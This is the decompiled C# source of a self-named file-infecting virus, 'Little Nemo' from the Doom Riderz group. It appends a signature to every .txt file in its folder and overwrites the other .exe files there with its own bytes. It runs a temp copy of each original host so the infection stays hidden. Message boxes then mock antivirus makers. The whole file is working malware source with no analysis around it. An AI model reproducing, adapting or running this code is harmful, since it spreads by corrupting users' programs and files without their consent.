using System;
using System.Collections;
using System.IO;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using nemo.My;

namespace nemo;

[StandardModule]
internal sealed class Module1
{
	[STAThread]
	public static void Main()
	{
		//IL_048a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0497: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a4: Unknown result type (might be due to invalid IL or missing references)
		string applicationBase = AppDomain.CurrentDomain.SetupInformation.ApplicationBase;
		string[] files = Directory.GetFiles(applicationBase);
		IEnumerator enumerator = files.GetEnumerator();
		while (enumerator.MoveNext())
		{
			object obj = Conversions.ToString(enumerator.Current);
			if (Operators.CompareString(Path.GetExtension(Conversions.ToString(obj)), ".txt", false) == 0)
			{
				string fileName = Path.GetFileName(Conversions.ToString(obj));
				FileStream stream = new FileStream(fileName, FileMode.Append, FileAccess.Write);
				StreamWriter streamWriter = new StreamWriter(stream);
				streamWriter.WriteLine("><(((*>");
				streamWriter.WriteLine("little nemo the virus");
				streamWriter.WriteLine("by synge flesh");
				streamWriter.WriteLine("of the mighty Doom Riderz");
				streamWriter.WriteLine("txt infected again by nemo");
				streamWriter.Close();
			}
		}
		string text = ((ApplicationBase)MyProject.Application).get_Info().get_AssemblyName() + ".exe";
		string text2 = Conversions.ToString(text.Length);
		string[] files2 = Directory.GetFiles(applicationBase);
		IEnumerator enumerator2 = files2.GetEnumerator();
		while (enumerator2.MoveNext())
		{
			string path = Conversions.ToString(enumerator2.Current);
			if (Operators.CompareString(Path.GetExtension(path), ".exe", false) != 0)
			{
				continue;
			}
			string fileName2 = Path.GetFileName(path);
			if ((double)fileName2.Length == Conversions.ToDouble(text2))
			{
				continue;
			}
			object obj2 = new FileStream(fileName2, FileMode.Open, FileAccess.Read);
			object obj3 = new BinaryReader((Stream)obj2);
			object[] array = new object[1];
			object obj4 = obj2;
			array[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null));
			object[] array2 = array;
			object[] array3 = array2;
			bool[] array4 = new bool[1] { true };
			object obj5 = NewLateBinding.LateGet(obj3, (Type)null, "ReadBytes", array3, (string[])null, (Type[])null, array4);
			if (array4[0])
			{
				NewLateBinding.LateSetComplex(obj4, (Type)null, "Length", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
			}
			byte[] array5 = (byte[])obj5;
			if (array5[200] == 4)
			{
				continue;
			}
			Path.GetTempFileName();
			Path.GetTempPath();
			FileStream output = new FileStream("temp.tmp", FileMode.Create, FileAccess.Write);
			BinaryWriter binaryWriter = new BinaryWriter(output);
			binaryWriter.BaseStream.Seek(0L, SeekOrigin.End);
			binaryWriter.Write(array5);
			binaryWriter.Flush();
			binaryWriter.Close();
			File.Copy("temp.tmp", "temp.exe", overwrite: true);
			Interaction.Shell("temp.exe", (AppWinStyle)2, false, -1);
			File.Delete("temp.tmp");
			NewLateBinding.LateCall(obj2, (Type)null, "close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			object obj6 = new FileStream(text, FileMode.Open, FileAccess.Read);
			object obj7 = new FileStream(fileName2, FileMode.Open, FileAccess.Write);
			object obj8 = new BinaryReader((Stream)obj6);
			object obj9 = new BinaryWriter((Stream)obj7);
			int num = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(NewLateBinding.LateGet(obj8, (Type)null, "BaseStream", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1));
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				byte b = Conversions.ToByte(NewLateBinding.LateGet(obj8, (Type)null, "ReadByte", new object[0], (string[])null, (Type[])null, (bool[])null));
				array2 = new object[2]
				{
					num2,
					SeekOrigin.Begin
				};
				object[] array6 = array2;
				array4 = new bool[2] { true, false };
				NewLateBinding.LateCall(obj9, (Type)null, "seek", array6, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					num2 = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(int));
				}
				array2 = new object[1] { b };
				object[] array7 = array2;
				array4 = new bool[1] { true };
				NewLateBinding.LateCall(obj9, (Type)null, "Write", array7, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					b = (byte)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte));
				}
				num2 = checked(num2 + 1);
			}
			NewLateBinding.LateCall(obj3, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(obj8, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(obj9, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(obj7, (Type)null, "close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(obj6, (Type)null, "close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		Interaction.MsgBox((object)"Little Nemo Virus, by synge flesh of the mighty Doom Riderz.", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"P.S. Fuck Anti-Virus Lamers.", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"Show respect to those who keep you in business.", (MsgBoxStyle)0, (object)null);
	}
}
